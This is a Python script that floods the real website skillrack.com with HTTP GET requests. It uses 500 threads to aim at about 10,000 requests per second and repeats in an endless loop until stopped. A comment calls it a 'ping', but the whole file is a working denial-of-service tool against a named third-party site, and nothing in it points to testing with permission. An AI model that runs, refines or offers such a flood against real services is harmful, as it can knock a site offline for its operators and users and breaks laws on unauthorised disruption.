
import requests
import threading
import time

time.sleep(1)

# URL to ping
url = "https://skillrack.com"

# Number of requests to send per second
requests_per_second = 10000

# Number of threads to use
num_threads = 500

# Number of requests each thread should send
requests_per_thread = requests_per_second // num_threads

# Function to send a request
def send_request():
    try:
        response = requests.get(url)
        print(f"Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

# Function for each thread to send a specific number of requests
def thread_task():
    for _ in range(requests_per_thread):
        send_request()

# Function to send multiple requests using threads
def send_requests():
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=thread_task)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Main loop to send requests every second
try:
    while True:
        send_requests()
except KeyboardInterrupt:
    print("Stopped by user.")
